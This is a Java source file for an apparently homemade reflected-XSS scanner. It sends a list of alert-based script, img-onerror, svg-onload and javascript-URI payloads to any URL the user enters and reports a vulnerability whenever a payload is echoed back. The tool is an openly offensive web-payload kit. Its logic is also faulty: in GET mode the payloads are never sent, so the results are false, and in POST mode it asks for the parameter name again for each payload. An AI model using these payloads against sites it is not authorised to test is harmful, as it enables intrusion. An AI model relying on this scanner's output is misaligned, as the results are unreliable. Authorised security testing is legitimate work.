import java.io.*;
import java.net.*;
import java.util.*;

public class xss_injection {
    // ANSI escape codes for colors
    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_GREEN = "\u001B[32m";
    public static final String ANSI_RED = "\u001B[31m";

    // Common XSS payloads
    public static final String[] COMMON_XSS_PAYLOADS = {
        "<script>alert('XSS')</script>",
        "<img src=\"javascript:alert('XSS')\">",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<svg/onload=alert(document.domain)>",
        "<iframe src=\"javascript:alert('XSS');\"></iframe>",
        "'\"--><script>alert('XSS')</script>",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "<input type=\"image\" src=\"javascript:alert('XSS');\">",
        // Additional XSS payloads
        "<script>alert(String.fromCharCode(88, 83, 83))</script>",
        "<img src=x onerror=alert(String.fromCharCode(88, 83, 83))>",
        "<svg/onload=alert(String.fromCharCode(88, 83, 83))>",
        "<body onload=alert(String.fromCharCode(88, 83, 83))>",
        // Add more payloads as needed
    };

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        try {
            // Prompt the user to enter the target website URL
            System.out.print("Enter your target website URL: ");
            String url = scanner.nextLine();

            // Prompt the user to enter the HTTP method (GET or POST)
            System.out.print("Enter HTTP method (GET or POST): ");
            String httpMethod = scanner.nextLine().toUpperCase();

            // Example payloads embedded in the code
            List<String> payloads = new ArrayList<>(Arrays.asList(
                "<script>alert('Hello from embedded payload')</script>",
                "<img src=\"javascript:alert('Embedded payload')\">",
                "<svg/onload=alert('Embedded payload')>",
                "<img src=\"x:gif\" onerror=\"alert('Embedded payload')\">",
                "<iframe src=\"data:text/html,<script>alert('Embedded payload')</script>\">",
                "<a href=\"javascript:alert('Embedded payload')\">Click me</a>"
                // Add more embedded payloads as needed
            ));

            // Add common XSS payloads
            Collections.addAll(payloads, COMMON_XSS_PAYLOADS);

            // Shuffle payloads to randomize order
            Collections.shuffle(payloads);

            // Perform XSS testing with each payload
            for (String payload : payloads) {
                // Create the HTTP request
                URL targetUrl = new URL(url);
                HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();
                connection.setRequestMethod(httpMethod);
                connection.setDoOutput(true);

                // Construct the payload
                String postData = "";
                if (httpMethod.equals("POST")) {
                    System.out.print("Enter POST parameter name: ");
                    String paramName = scanner.nextLine();
                    postData = paramName + "=" + URLEncoder.encode(payload, "UTF-8");
                }

                // Send the request
                if (httpMethod.equals("POST")) {
                    connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
                    wr.writeBytes(postData);
                    wr.flush();
                    wr.close();
                }

                // Read the response
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();

                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();

                // Check for successful XSS injection
                if (response.toString().contains(payload)) {
                    System.out.println(ANSI_GREEN + "XSS vulnerability detected with payload: " + payload + ANSI_RESET);
                } else {
                    System.out.println(ANSI_RED + "No XSS vulnerability detected with payload: " + payload + ANSI_RESET);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            // Close the scanner
            if (scanner != null) {
                scanner.close();
            }
        }
    }
}
